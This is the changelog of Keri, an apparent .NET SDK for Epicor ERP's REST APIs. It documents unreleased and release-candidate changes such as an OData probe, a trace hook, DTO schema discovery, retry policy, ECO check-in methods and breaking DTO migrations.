# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## Versioning

This project follows [Semantic Versioning 2.0.0](https://semver.org/spec/v2.0.0.html). Each package versions independently.

- **From 1.0.0**, the public API is stable: breaking changes appear only in a major version. A minor version (`1.X.0`) adds; a patch version (`1.x.Y`) fixes.
- **A release candidate** (`1.0.0-rc.N`) is a prerelease. NuGet does not install it unless a consumer opts in, and its API may still change between candidates in response to what the candidates find.
- **Before 1.0.0** — the `0.x` entries below — a minor version could break and a patch contained only fixes.
- **Every breaking change is marked Breaking** in its entry, with a note on how to migrate.

Releases are tagged per package as `<Package>-vX.Y.Z` — for example, `Keri.Epicor-v1.0.0-rc.1`. The `[0.x.y]` entries and `vX.Y.Z` tags further down are earlier whole-repository releases.

---

## Unreleased

### Added

- **An OData probe POC**, answering whether a given session honours the query options every entity-set read depends on. Epicor's v1 endpoints (`/api/v1/`) are not OData; its v2 endpoints are, and setting `ApiKey` is what selects them. On a v1 session the `$filter` and `$top` Keri puts on the URL are believed to be ignored — no error, just the full collection — which is the worst shape a defect can take: the call succeeds, the rows look like rows, and the wrongness surfaces somewhere downstream.

  Two reads of `PayMethod`, one of the smallest reference tables in Epicor, so an ignored `$top` costs a handful of rows rather than a table scan. The first establishes the table is not empty; the second filters on a value that cannot exist. Nothing back means `$filter` worked. Anything back means it was dropped, and the POC says so and names what it affects. Filtering for an impossible value rather than a real one keeps the answer unambiguous and needs nothing configured per install.

  The URLs come from `OnTrace`, so it reports what Keri actually sent rather than what it intended — which separates "Epicor ignored the option" from "Keri never included it." Only the path and query are printed, with the company segment of a v2 URL masked, so the output is safe to paste into an issue. It runs first, because its answer decides how to read the row counts every other read POC prints.

- **A trace hook on the session.** `RestSessionKey.OnTrace` is called as each HTTP attempt completes with a `KeriTraceEvent`: method, URL, status, elapsed milliseconds, attempt number, whether a retry follows, and the error when there was one. Null by default, so nothing is traced unless you ask. Keri takes no logging dependency — wiring it to `ILogger`, Serilog or `Console.WriteLine` is one line of your code. A handler that throws is ignored rather than failing the call.
- **`OperationResult<T>.Steps`** — what an orchestrator did on the way to a result, in order, and on a failure the step that stopped it. The trail travels with the result, so it survives being returned, logged, or handed to you by someone reporting a problem, including from inside a BPM where there is nowhere to log. Empty for single service calls, which `ResourcePath` and `ErrorMessage` already describe. Every orchestrator records it.

- **DTO discovery.** A DTO models a subset of its Epicor table — `Part` models 56 of 397 columns, and the rest reach the caller through `ExtraData`. Which columns make that subset is the one part of maintaining a DTO that cannot be derived, and until now it rested on reading column names.

  Your server describes them. The OData schema document carries a description per column, and on a live install 324 of `Part`'s 397 columns, 203 of `CheckHed`'s 257 and 140 of `SerialNo`'s 203 arrive with Epicor's own prose. `SchemaProbePoc` reads it for an entity and writes the raw document plus a CSV of every column — type, nullability, description, whether the schema declares it part of the entity key, whether the DTO models it, and a `Signal` combining those with the reason in a `Why` column. `InDto` is read from the live DTO through `SelectFor<T>()`, so the annotation cannot drift from the code.

  **The useful signal is whether a column is described at all.** An undescribed column is usually not a stored column: the business object adds fields no table holds — values denormalized from a related table (`VendorNumName`, `CurrencyCodeCurrSymbol`) and flags that drive a screen (`EnableVoidLN`, `BankAccountEnabled`). Epicor documents tables, so those arrive with nothing said about them. The standard user-defined columns (`Character01`, `ShortChar02`, …) are the exception: undescribed by design, because Epicor cannot document a column whose meaning each installation sets.

  **The discovery pass** — `KERI_POC_DISCOVER=true` — covers all twenty DTO-backed entity-set reads, and proposes changes. It proposes removing a modelled column the server does not describe whose name is another column's name plus a suffix, or that reads as a screen flag. It proposes adding a column the schema declares part of the entity key, and a described column belonging to a family the DTO already models — the currency counterpart of a modelled amount, or one sharing a long leading stem with it. A currency dimension the DTO uses nowhere produces no suggestion, so a deliberate absence is not undone one counterpart at a time.

  **Before proposing a removal it checks whether anything uses the column**, scanning every `.cs` file under the solution root. A referenced column keeps its place and the CSV records where. With no solution file above the executable, every removal is withheld rather than assumed safe. It is a text scan, not a compiler: a column called `Company` matches every DTO's `Company`, which is the safe direction — a false hit turns an automatic removal into a decision a person makes. It cannot see code outside the repository, so a clean scan means safe *here*; removing a public property remains a breaking change for anyone holding the package.

  **What it will not do is rank columns.** Nothing Epicor publishes says whether a described column matters, and a described column unrelated to anything modelled stays a `candidate` for a person to read. A column absent from the previous run's CSV is marked `New` — that is what an upgrade added, and where a review starts.

  Then one question: **review**, which writes an editable `schema-<Entity>-keep.csv` pre-filled with the recommendation; **accept**, which generates `<Entity>.generated.cs` from exactly the additions and removals just listed; or **nothing**. A keep file edited on an earlier run is acted on at the start of the next one, before anything is asked. Generated DTOs carry the right C# types off the Edm types and Epicor's description as each doc comment, and land beside the CSVs — **no file under `Keri.Epicor/Dtos` is written**. A redirected stdin answers "nothing", as it declines a write.

  The rules live in `DtoDiscovery`, apart from the program that fetches and prints, and are covered by thirty-one offline tests. `DTO_FIELD_SELECTION.md` is the written procedure, including the four ordered tests for an undescribed column and the asymmetry that settles a tie: an unmodelled column still arrives through `ExtraData` and adding the property later is a minor release, while removing one is major. `ADDING_A_SERVICE.md` points at it from the DTO section.

- **A proposed addition is screened before it is proposed.** Belonging to a family the DTO already models is what makes a column a candidate; it is not what makes it worth modelling. Three screens run before an addition is suggested, each recording its reason in `Why` so a reviewer can disagree with it: a rendering of another modelled column (`ScrapReasonCodeDesc` against `ScrapReasonCode`), a screen flag, and a description that is only the column name restated. Across the twenty entities they screen out ten columns a family match would otherwise have proposed. Tests pin both directions, including the false positives that matter: `ElecRemittanceSentDate` is a sibling of `ElecRemittanceSent` rather than a rendering of it, and "Shipped Date" is a description rather than a restatement of `ShippedDate`.

- **A modelled column the server's schema does not declare is reported.** Every rule walks the server's columns, so a property the DTO carries that the schema never mentions was invisible to all of them — not judged, not reported, and absent from the next generated DTO. It now gets a row of its own, signalled `not in schema`, in both the CSV and the summary.

  It is not a proposed removal, because there is nothing to weigh, but it has to be said out loud. `$select` is built from the DTO's properties, so the column is asked for on every read of that entity and nothing comes back for it; and regenerating the DTO drops the property, which is breaking for anyone holding the package. The probe reports where such a column is referenced in the repository so the cost is known first, but a reference cannot keep a column the server does not have. An absence can mean the column was renamed or retired, or that this installation does not license the module that surfaces it, and the schema cannot tell those apart. On this repository it found two: `QuoteDtl.UnitPrice` and `QuoteHed.JobComment`.

- **`EngWorkBenchSvc.CheckInAsync` and `ApproveAndCheckInAllAsync` are public.** `AddMtlsAsync` checks the parent part out to the ECO group and leaves it checked out — which is where Epicor's own flow leaves it, since a part stays under revision until someone reviews and approves it. The orchestrators stop at that handover point on purpose. A consumer automating a full cycle needs a way to carry on past it, and until now the SDK had none: `ApproveAndCheckInAllAsync` was `internal`, and there was no check-in at all.

  `CheckInAsync(groupID, partNum, revisionNum)` releases the checkout and nothing else. `ApproveAndCheckInAllAsync(groupID, auditText)` is the sign-off: it approves **every row in the group** and checks the group in, in one call — `ipPartNum` and `ipRevisionNum` are sent blank, so the scope includes any part a different process added. Its doc comment opens with **Use with caution: this is meant for automation purposes in a workflow that is proven to be reliable with extensive testing**, because approving from code removes whatever review your process expects a person to perform.

  **`ipAuditText` is now a parameter.** It was hardcoded to `"ECO Group * * Import"`, which Epicor writes into the audit trail as the permanent reason for the approval — the same eleven characters for every approval by every consumer, describing nothing. It defaults to the visible placeholder `*Audit Message*` so that an unset value reads as unset rather than as a real explanation.

  Both return `OperationResult<JObject>` through `HandleResponse`, like every other public method. **Neither request shape has ever been sent**: `ApproveAndCheckInAll` was wrapped but called by nothing, and `CheckIn`'s payload is inferred from `CheckOut`, its paired operation, because Epicor's metadata names the endpoint without declaring its parameters. `ipValidPassword` is left at the value each method already carried — `false` for approval, `true` for check-in — rather than guessed at.

  `ApproveAndCheckInAllAsync` being `internal` while nothing called it is the case `CONTRIBUTING.md` now rules out: the test for the internal category is whether an orchestrator actually chains the method. A wrapper nothing calls is not an implementation detail, it is unexposed API.

- **`ENGINEERING_WORKBENCH.md`** — every step of the three ECO orchestrators, written from the method bodies. `AddMtlsAsync` in eight steps with the Epicor call behind each, what happens to the threaded dataset, and two things a caller would otherwise get wrong: the ECO context is written as top-level properties beside the `ds` envelope rather than inside it, and the workflow assigns `MtlSeq` itself in steps of ten, ignoring whatever is on `ECOMtlInput.MtlSeq`. `AddOprsAsync`, which had no breakdown anywhere, including the convention that its source part is the text before the first space in `PartNum`, and the copy rule that skips any value parsing as decimal zero — so a source operation's genuine zero does not overwrite the template's default. `GetECOTreeAsync`, the whole flow in order, and the state each call leaves behind.

  It also documents the step that is easy to miss because it lives on another service: a revision must exist before materials can be added to it, and `PartSvc.AddPartRevAsync` is what creates one.

- **`SkipDefaultSelectAttribute`** — a DTO can turn off the default `$select` its entity-set reads send. `$select` exists to reduce a response to the columns a DTO can bind, which pays when the DTO is a narrow core of a wide table and stops paying when it already names nearly every column: naming them explicitly makes Epicor emit fields it otherwise omits. Measured on a live install at 25 rows, projecting `Part` onto its 52 columns returned a payload 83.1% smaller, while three DTOs modelling every column of their tables returned payloads 15.6%, 5.6% and 5.7% *larger* with the projection than without.

  It changes nothing a caller asked for: an explicit `select`, or any `additionalColumns`, projects as it always did. It cannot cost a caller data — an unprojected read returns at least the columns the DTO models and often more, and the surplus lands in `ExtraData`. No DTO in this library carries it; it exists for consumers defining their own DTOs on top of `EpicorSvc`, and `ADDING_A_SERVICE.md` says when to reach for it. Covered by six tests.

### Fixed

- **The discovery CSV recorded a recommendation the run then changed.** Each CSV was written as its entity was probed, before any proposed removal had been checked against the source tree. A column the reference check went on to spare was left marked `drop suggested` in the file that outlives the console, so the durable record disagreed with the decision. The CSVs are now written once, after every entity is probed and every proposal is settled. The per-entity progress line still prints mid-scan and says `proposed` rather than `suggested` for removals, because at that point it cannot know what survives.

- **The reference scan counted the discovery rules as a use of the column they name.** A rule proposing to drop a column has to write that column's name down, and the test pinning the rule writes it down again. `ScanForUsages` read both files, found the name, and withdrew the removal — so a column the rules named was rescued on every run whether or not any caller touched it. `DtoDiscovery.cs` and `DtoDiscoveryTests.cs` are now excluded from the scan: neither consumes a DTO, so neither is evidence that a property is in use.


- **An inner service no longer creates its own `HttpClient`.** `EngWorkBenchSvc` and `InvTransferSvc` are the only services that build another service — a `BomSearchSvc` for the source BOM in `AddOprsAsync`, a `SelectedSerialNumbersSvc` for the serial-number steps in `MoveInventoryAsync`. Both used the single-argument constructor, so the inner service built a client of its own. A caller supplying a client from `IHttpClientFactory`, or one carrying a proxy, logging or retry handler, did not get it used for those calls, and each service held a second connection pool. `EpicorClient` already passed its client to all 24 top-level services; these two inner ones were missed.

  `RestConnect.HttpClient` is now `protected internal` so a derived service can hand its client across whether the caller supplied it or Keri created it, and both sites pass it unconditionally. A service receiving a client does not own it and will not dispose it — ownership stays with whoever created it. **This widens the public surface**: `protected` members are API for anyone subclassing `RestConnect`.

- **Six dataset reads report a bad shape instead of throwing.** Found by scanning every service file for the defect class `ChangePartUnitPriceAsync` had: 59 envelope dereferences across 44 files, 26 without an obvious guard, six real once each was read in context.

  `AddMscShpDtAsync` threaded `OnChangePartNum` and `OnChangeQuantity` without checking either, then indexed `ds["ds"]["MscShpDt"][0]`. Both return a raw `JObject` and an error-shaped response is a well-formed one, so a declined change threw `NullReferenceException` and lost Epicor's explanation. Each step is now checked before the next call and before the commit; nothing has been written at that point, so the failure is `Uncommitted`.

  `ProcessSelectedSerialNumbersAsync` is **public** and takes the dataset as an argument, then dereferenced it on its first statement — so a caller passing a document without a `SerialNumberSelection` table received an `ArgumentNullException` from a library whose premise is that errors are values. It now returns a failure naming the table it expected. **This is a public behaviour change**: code catching `ArgumentNullException` around it will stop seeing one.

  `AddOprsAsync` (the source BOM's `PartOpr` table and the `ECOOpr` template row), `AddPartRevAsync` (the `PartRev` table) and `GenerateGroupAsync` (the `ECOGroup` row) each dereferenced after a call that reported success, so they could only break on an HTTP 200 whose body was not the expected shape — `HandleResponse` falls through gracefully and the transport never inspects a 2xx body, so nothing upstream catches it. Each now returns a failure naming the step and the shape it wanted.

  `AddMtlsAsync` already converted its populate-loop failure to a value inside a `try`/`catch`; it reported the exception. It now builds the failure with `StepFailure`, which prefers Epicor's own `ErrorMessage`, and keeps the exception attached.

  **What these guards do not do is prevent a bad write.** No Epicor endpoint accepts an error object as its dataset, so a chain fed a broken one fails at the next call regardless. What changes is that the caller receives an `OperationResult` failure carrying the status, step trail and raw response, rather than an exception carrying none of them.

  Covered by `MiscShipGuardTests` and `WriteOrchestratorGuardTests` — twelve tests over a scripted handler, including one pinning that a failed material still unlocks the ECO group and never reaches `Update`.

- **`ChangePartUnitPriceAsync` reports a declined price change instead of throwing.** Its first step unwraps `["parameters"]` from the `ChangePartUnitPrice` response, and a response without that envelope — an unknown part, a permissions refusal, a transport failure — made `JObject.FromObject(null)` throw `ArgumentNullException`, discarding the Epicor message that explained why. It now returns a failure carrying that message, the same treatment the orchestrators received in 0.4.2 and 0.5.0. **Stopping at that point is unchanged and deliberate**: the chain must not continue on a dataset Epicor never produced. Only the way it stops is different.

- **A failure crossing an orchestrator boundary no longer loses `ErrorType` and `CorrelationId`.** An orchestrator whose return type differs from the call underneath it has to re-describe that call's failure, and eleven places rebuilt it from four of its eight fields — dropping the provider error type and the correlation id, which are exactly the two the documentation tells you to branch on and to quote to whoever reads the server log. `CreateProjectAsync`, `CreateQuoteAsync`, `AddOprsAsync`, `GetUDCodeDescriptionAsync`, `TruncateAsync`, `SaveAsync`, `GetByPONumAsync`, `TestConnectionAsync` and the typed UD-table reads were affected. There is now one conversion in the codebase, and it carries message, status code, resource path, raw response, error type, correlation id, exception, commit stage and step trail.

  Three places that look identical were left alone deliberately: the 404 and 409 from `GetByPONumAsync`, and `SaveAsync`'s "returned no row to populate". In each the underlying call *succeeded* and Keri is the one deciding the operation cannot continue, so there is no provider error to carry.

- **Two entity-set reads no longer build a default query string past the server's limit.** IIS's default `maxQueryString` is 2,048 characters. The `$select` generated from `CheckHed` ran to 4,323 URL-encoded characters and the one from `SerialNo` to 3,260, so on a server left at that default those reads did not return a larger payload — they did not return at all. Narrowing both DTOs (below) brings them to 1,178 and 926.

  A caller could always sidestep it by passing a shorter `select`, or an empty list to send no `$select` at all. What failed was the default, which is the path anyone takes first.

### Changed

- **Warnings are errors on CI.** `TreatWarningsAsErrors` is set in `Directory.Build.props` under a `ContinuousIntegrationBuild` condition, and `ci.yml` passes `-p:ContinuousIntegrationBuild=true` on the build step. Unconditionally the property would turn a warning a newer Roslyn introduces into a build failure for a contributor on code they did not write, on a repository with no `global.json` pinning the SDK; conditioned, CI holds the line and a local build only warns. Add the same switch locally to reproduce a CI failure. The switch is also what SourceLink wants for deterministic path mapping, so the two travel together.

- **The POCs ask before they write, and clean up after themselves where they can.** `KERI_POC_ALLOW_WRITES` was the only thing standing between running the examples and a record in Epicor. It is read once at startup, so someone who set it to watch a sales order get created had also armed every other write POC in the project — including any added later — and it stays set for the rest of their shell session. It answers "this program may write," which is not "write this, now."

  Each write is now confirmed at the moment it happens, after the POC names the records it will create, the company, the endpoint, and what becomes of them afterwards. The environment variable still gates the prompts; it no longer replaces them. Declining leaves the rest of the run intact, and a redirected stdin counts as declining rather than as consent, so a scripted run never writes even when armed.

  **`UDTablePoc` now offers to delete the row it created**, after pausing so you can look at it. Its `Key2` carries a timestamp, so each armed run wrote a *new* row rather than replacing the last one, and they accumulated. This also gives `UDTableSvc.DeleteByIDAsync` — the only delete Keri wraps — its first coverage anywhere. The row is never removed unasked, and never as a side effect of something else failing: on any path where the answer could not be obtained, the keys are printed and the row is left alone.

  `KeriDemo` already worked this way, stating what it would write before writing it and offering to remove its rows afterwards. The POCs held a weaker standard than the demo shipped alongside them.

- **`CreateOrderAsync` guards its commit like the other two creators.** If `MasterUpdate` reports success but the echoed dataset carries no `OrderNum`, the result is now a failure marked `Indeterminate` rather than a success the caller cannot read an order out of. All three `Create*` orchestrators are non-idempotent, so the case that matters is a caller seeing success, finding nothing usable, and retrying — which would create a second order. `CreateQuoteAsync` and `CreateProjectAsync` have guarded this since 0.7.0; `CreateOrderAsync` did not.

  A genuinely rejected commit — a credit hold, a validation failure — is unaffected: it still reports Epicor's message, `ErrorType` and `CorrelationId`, and is classified by `ClassifyCommit` before the guard is reached.

- **`EpicorRestSessionKey` moved from `Keri.Epicor.Dtos` to `Keri.Epicor`.** It is the session a caller constructs first, not a row shape, and filing it with the table DTOs meant a developer with only `using Keri.Epicor;` in scope saw nothing when they typed `new Epicor…` — and reasonably concluded the package was broken. Nothing else changed about the type.

  **Migration:** add `using Keri.Epicor;`. Most code already has it for `EpicorClient` and `OperationResult<T>`, so in practice this is usually a no-op — of the 36 files in this repository that reference the type, 35 needed no change. You still need `using Keri.Epicor.Dtos;` for the row DTOs and `using Keri.RestTransport;` for `RestAuthenticationObject`; this makes the session discoverable, it does not reduce a working program to one `using`.

- **`Local.targets.template` brought up to date.** The opt-in post-build DLL copy it documents still works and is unchanged, but the file had gone stale: it named `EpicorSvcs`, `RESTServices` and `FileHandling`, none of which have existed since the rename, and one of its two source globs pointed at a folder that no longer exists. A glob matching nothing expands to nothing silently, so it copied three DLLs while describing a nineteen-DLL closure. It now names the four current projects, pulls from `Keri.Files` and `Keri.Mail` as well, drops the itemised dependency list that went stale in the first place, and tells you to check the reported count — which is the only signal a broken path gives you.

  `CONTRIBUTING.md` now documents the mechanism under **Testing a change against your own project**. It had been discoverable only by opening a `.template` file inside a source folder, which is not where a contributor looks for "how do I try my change in a real consumer".

- **Every write returns the dataset Epicor returned.** `CreateProjectAsync` returned a `Project`; `CreateQuoteAsync` returned a hand-rolled `{QuoteNum, QuoteObj}` object with the number stringified. Both now return the saved dataset as a `JObject`, like `CreateOrderAsync` and every other write. Epicor hands back a multi-table document; projecting it to one row discards the rest, and picking one field to return means the method guessing which field you wanted. Use `ExtractDto<T>("QuoteHed")` or index the dataset to get what you need from it.

  Both keep their post-commit guard: if `Update` succeeds but the saved dataset has no `QuoteNum` or no `Project` row, the result is a failure marked `Indeterminate` — the record exists, so establish what was created before retrying.

  **Migration:** `CreateProjectAsync` callers reading `result.Value.ProjectID` become `result.Value.ExtractDto<Project>("Project")?.ProjectID`. `CreateQuoteAsync` callers reading `result.Value["QuoteNum"]` become `result.Value["ds"]["QuoteHed"][0]["QuoteNum"]`, now an integer rather than a string.

- **All four assemblies are now strong-named.** A strong-named assembly can only reference other strong-named assemblies without a compiler warning, so an unsigned Keri meant a warning — or, for a consumer building with `TreatWarningsAsErrors`, a build failure — in any application that signs its own output. The key lives in the repository as `Keri.snk` and is applied to every project by `Directory.Build.props`. It is not a secret: strong naming in .NET is an identity mechanism, not a security one, and committing the key is what lets contributors and CI build the solution.

  **Migration:** signing changes assembly identity. Rebuild against the new packages rather than dropping the assemblies in place, and update any binding redirect written against the unsigned identity. Nothing else about the API changes.

- **`CheckHed` and `SerialNo` model a practical core rather than the whole table.** `CheckHed` goes from 257 properties to 84, `SerialNo` from 203 to 71. **Breaking.**

  What each keeps was chosen against the column descriptions the server publishes. `CheckHed` keeps identity and posting status, the clearing and voiding state, the base and document amounts including the invoice-versus-miscellaneous split, the payee address, the payment instruction, and the vendor bank fields an electronic payment needs. `SerialNo` keeps identity and status, warehouse location, the job, vendor-receipt, shipment, order and customer links, the RMA, DMR and non-conformance references, serial formatting, and the asset and field-service links.

  What each drops is reachable unchanged through `ExtraData`: for `CheckHed`, the `Rpt1/2/3*` reporting currencies, the country-specific columns (`NO*`, `SE*`, `MX*`, `TH*`, `US1099K*`, `SEPA*`), petty cash and bank reconciliation, and Epicor's denormalized join columns and screen-state flags; for `SerialNo`, the `OTS*` one-time-ship address fields, GPS and meter readings, the prior-job and labor-sequence columns, and the denormalized join columns.

  **Migration:** a dropped property becomes `dto.ExtraData["ColumnName"]`, which is a `JToken` — convert it yourself, for example `(decimal?)dto.ExtraData["Rpt1CheckAmt"]`. A denormalized column is better read from the service that owns it: `VendorNumName` through `VendorSvc`, `PartNumPartDescription` through `PartSvc`, typed and current. Code referencing a dropped property fails to compile, which is the intended signal.

- **Sixteen DTOs rebuilt from the server's schema.** 888 typed properties become 965: 82 added, 5 removed, 23 retyped. **Breaking** for the removals and the retypes.

  Each DTO keeps its own class documentation and takes Epicor's published text as the doc comment on every property. The column set is the discovery pass's recommendation with nine additions rejected by hand — Customer's four currency-picker fields, `OrderHed.CustomerDocFound`, `POHeader.ApproveMessage`, and `RcvDtl`'s `CostPerFactor`, `ReceivedQty` and `InspectionFlag` — each of which the server's own description gives as screen state rather than record data.

  **The retypes are corrections.** `SysRevID` becomes `long` on eleven DTOs, because the schema declares `Edm.Int64` and an `int` cannot hold it. `QuoteDtl.DisplaySeq` becomes `decimal`, because its own description says the decimal portion sequences kit components under their parent — which an `int` cannot represent. Six percentage and cost-base fields narrow to `int` per the schema. `SysRowID` becomes `string` on `RcvDtl` and `RcvHead`, matching the eleven other DTOs that model it.

  **The removals.** `PayMethod` drops `COPayMethodDesc`, `PITypeDescription` and `TypeDescription`, all undescribed and denormalized from a column it already models. `QuoteDtl.UnitPrice` and `QuoteHed.JobComment` are not columns this server declares — the real ones are `OrderUnitPrice`, `DocUnitPrice` and `ExpUnitPrice`, and `QuoteComment` — so both were going into `$select` on every read of those entities with nothing coming back for them.

  The widest generated `$select` is now `CheckHed` at 1,380 characters, against IIS's 2,048 default.

  **Migration:** a dropped property becomes `dto.ExtraData["ColumnName"]`, a `JToken` you convert yourself. A retyped property fails to compile wherever the old type was assumed, which is the intended signal.

- **No DTO models `BitFlag`.** **Breaking** across seventeen DTOs, and reachable as `dto.ExtraData["BitFlag"]`.

  `BitFlag` packs several indicators the business object computes for its client — whether a row has memos, attachments or CRM calls — into a single integer, which is what drives the icons on a Kinetic screen. Epicor publishes no description for it and no bit layout in the schema, and the layout differs by table and by version. A typed property therefore hands a caller a number nothing in this library can explain, while every fact inside it is available typed and current from the service that owns it. A caller who knows the layout reads it from `ExtraData` with one cast.

  **Migration:** `dto.BitFlag` becomes `(int?)dto.ExtraData["BitFlag"]`.

- **The POCs no longer probe schemas unasked.** `SchemaProbePoc` runs as a demonstration by default — one entity, one schema read, one CSV, nothing judged and nothing scanned. The discovery pass is maintenance, and a program someone runs to see how the SDK works should not walk their disk; `KERI_POC_DISCOVER` arms it, following `KERI_POC_ALLOW_WRITES`'s convention. The gate is about surprise rather than danger: neither mode writes to Epicor, and neither writes into the source tree.

## Keri.RestTransport / Keri.Epicor / Keri.Files / Keri.Mail 1.0.0-rc.2 — 2026-09-23

The second release candidate. Everything here is additive: rc.1 code compiles unchanged against rc.2.

One `HttpClient` now serves a whole `EpicorClient` rather than one per service, you can supply your own, and transient failures are retried — with writes deliberately held back.

### Added

- **An `HttpClient` can be supplied.** `new EpicorClient(session, httpClient)`, and the same overload on `RestConnect`, `EpicorSvc` and every service. Pass one from `IHttpClientFactory`, or one carrying your own handlers for retry, logging, a proxy or a client certificate. Keri never disposes a client you supply, and sets no headers or timeout on it — so it can be shared with the rest of your application, and a fake handler can stand in for the server in your tests. The existing constructors are unchanged and still create and dispose a client of their own.
- **Retry on transient failures**, configured by `RestSessionKey.Retry` (a `RetryPolicy`). Defaults: 3 attempts, exponential backoff from 200ms with jitter, capped at 5s, honoring a `Retry-After` header. A read is retried on 408, 429, 500, 502, 503 and 504, and on a network failure or timeout. **A write is retried only on 429**, where the server refused it without processing — never after a timeout, because a timed-out write may already have committed, which is what `FailureStage.Indeterminate` exists to report. `RetryWrites` extends writes to the other transient statuses; nothing extends them to timeouts. `Attempts = 1` disables retrying.

### Changed

- **One `HttpClient` per `EpicorClient`, instead of one per service.** Each service constructed its own, so a facade that touched five services held five connection pools to the same server. The facade now creates one and hands it to every service it builds, and disposes it with itself.
- **Credentials go on each request** rather than on the client's default headers. Nothing changes on the wire. It is what makes one client safe to share — and to accept from a caller — and it means a refreshed `BearerToken` takes effect on the next call, where before it could not take effect at all.
- A supplied client's own `Timeout` governs; `RestSessionKey.Timeout` applies to clients Keri creates.

## Keri.RestTransport / Keri.Epicor / Keri.Files / Keri.Mail 1.0.0-rc.1 — 2026-09-22

The first release candidate, and the first release published to nuget.org. All four packages move to one version together: a stable package cannot depend on a prerelease one, so they are released as a set and will version independently again afterwards.

This candidate settles the public API. Everything reachable from outside the packages is meant to be there; the narrowing and the renames below are the last of that work. **Breaking:** the narrowed surface and the renamed members, both source-level — recompile against the new names. Install with the prerelease flag: `dotnet add package Keri.Epicor --prerelease`.

Epicor Functions are verified against a live Kinetic tenant.

### Added

- **`FunctionSvc`**, reachable as `EpicorClient.Function`, calls Epicor Functions. `InvokeAsync` returns the output parameters as a `JObject`; `InvokeAsync<T>` maps them onto your own type. Input parameters are passed as an object whose properties are named after them. `staged: true` calls a library's unpublished version.
- **`RestConnect.RestCallWithModifierAsync`**, a protected method that calls a path under a different URL segment than the session's default. `FunctionSvc` uses it to reach `/api/v2/efx/`.
- **`Emailer.Send(EmailSpecs, SmtpSettings)`** — the relay configuration is supplied per call, so `EmailSpecs` can be sent directly instead of only through `SendReport`.

### Changed

- **Comments and XML docs refer to Keri as an SDK throughout.**
- **Breaking — the public surface is narrowed ahead of 1.0.** Everything below was reachable by a consumer and is not meant to be part of the API. No documented call is affected; `EpicorSvc.NewDataset()`, the services, the DTOs and the result types are unchanged.
  - `OperationResult<T>`'s properties are now read-only outside `Keri.Epicor`. Build results with `OperationResult<T>.Success(...)` and `OperationResult<T>.Failure(...)`, which are unchanged.
  - `EpicorSvc`'s helpers — `EpicorSession`, `EscapeODataLiteral`, `MarkUncommitted`, `MarkIndeterminate`, `ClassifyCommit`, `StepFailure` — are internal. Services are defined inside the SDK; `EpicorSvc` is not an extension point. Use `ODataFilter.Escape` (public) for literal escaping.
  - `RestConnect.sesh` is a protected read-only property rather than a public field, `RestConnect.RestInit` is private, and `RestConnect.UrlEncode` is protected. `RestConnect` remains subclassable for non-Epicor APIs.
  - `Emailer.Send(EmailSpecs)` is internal; the new two-argument overload replaces it.
- **Breaking — public names follow .NET conventions.** Source-breaking only; recompile against the new names.
  - `SmtpSettings`: `host`, `from`, `port`, `enableSsl`, `username`, `password`, `developerEmail` are now `Host`, `From`, `Port`, `EnableSsl`, `Username`, `Password`, `DeveloperEmail`.
  - `RestAuthenticationObject.Userkey` is now `Password`; `DynamicURLModifier_Basic` and `DynamicURLModifier_Keyed` are now `DynamicUrlModifierBasic` and `DynamicUrlModifierKeyed`.
  - Parameter names, which callers can use as named arguments: `ExcelWriter.CreateExcelFileFromDT(dt, filePath, sheetName, headerMap)`, and `headerMap` on the `TabularRenderer` methods.
  - `Emailer` and `ExcelWriter` are static classes. Both held only static members; neither can be instantiated now.
  - `ExcelReader.GetAlphaFromStr`, `TabularRenderer.GetPropertyNames`, `EpicorSvc.FormatJObjectResults` and `Emailer.emailbody` are internal. They are implementation details of the methods that use them.

### Fixed

- **`ECOMtl`'s doc said the DTO includes installation-specific `_c` columns.** It models standard columns only; custom columns arrive in `ExtraData`, as on every DTO.
- **`EpicorSvc.GetActiveRowIndex` threw a `NullReferenceException`** when no row was marked `A` or `U`, though it documented a null return. It now returns null for that case, for an empty table, and for a null argument.
- **`RestConnect.RestInit` was public**, so a second call replaced the `HttpClient` without disposing the one in flight. It is private, and the constructor remains the only caller.
- **`Emailer.Send(EmailSpecs)` could not be used from outside the package** — the SMTP settings it reads travel in an internal member, so no caller could supply a relay host.
- **A successful response with an empty body was reported as a failure.** The transport tried to parse the body as JSON and returned the parse error, so an HTTP 204 — or an Epicor Function with no output parameters — looked like a failed call. An empty body on a success status is now an empty object.
- **`FunctionSvc` sent calls it knew would be refused.** Functions are served by REST v2, which requires an API key; on a Basic-only session the call went out and came back as HTTP 403. It now fails before the request, saying which setting is missing.

## Keri.RestTransport 0.5.0 / Keri.Epicor 0.9.0 / Keri.Files 0.7.0 / Keri.Mail 0.7.0 — 2026-09-21

Every package gains a .NET Standard 2.0 build and a lower .NET Framework floor, and ships its XML documentation. `Keri.Files` changes one method's return type. **Breaking:** `ExcelReader.WorksheetToJArray`.

### Added

- **`netstandard2.0` builds** of all four packages, for applications on .NET 5, 6 and 7 — including assemblies loaded by a Kinetic application server running on .NET 6.
- **XML documentation in every package.** IntelliSense shows the doc comments for package consumers.
- **`ExcelReadResult`** in `Keri.Files`: `IsSuccess`, `Rows`, `ErrorMessage` and `Exception` for a worksheet read.
- **`COMPATIBILITY.md`** — supported Epicor versions, running outside Epicor versus inside a BPM or Function, which build to deploy on which server runtime, and what has been verified.
- **`ADDING_A_SERVICE.md`** — a worked example of adding a Business Object service and its DTO.
- **Trademark and independence notice** in `README.md` and `NOTICE`.

### Changed

- **.NET Framework targets lowered.** `Keri.RestTransport`, `Keri.Epicor` and `Keri.Files` target `net461`; `Keri.Mail` targets `net462`. `net48` applications use these builds. Each package now builds for three targets: .NET Framework, `netstandard2.0` and `net8.0`.
- **Breaking — `ExcelReader.WorksheetToJArray` returns `ExcelReadResult`** instead of `JArray`. A failed read is reported on the result instead of being returned as a serialized exception inside the array. To migrate:

  ```csharp
  ExcelReadResult result = new ExcelReader().WorksheetToJArray(path);
  if (result.IsFailure)
  {
      Console.WriteLine(result.ErrorMessage);
      return;
  }
  JArray rows = result.Rows;
  ```

- **`Keri.Mail` selects its SMTP client by target family.** `System.Net.Mail` on .NET Framework; MailKit on `netstandard2.0` and `net8.0`. Port 465 (implicit TLS) is rejected on every target.
- **The test suite runs on `net48` and `net8.0`.**
- **Documentation describes Keri as an SDK**, adds the Epicor compatibility section to the README, and documents the port 465 limitation in `CONFIGURATION.md` and `SECURITY.md`.

### Fixed

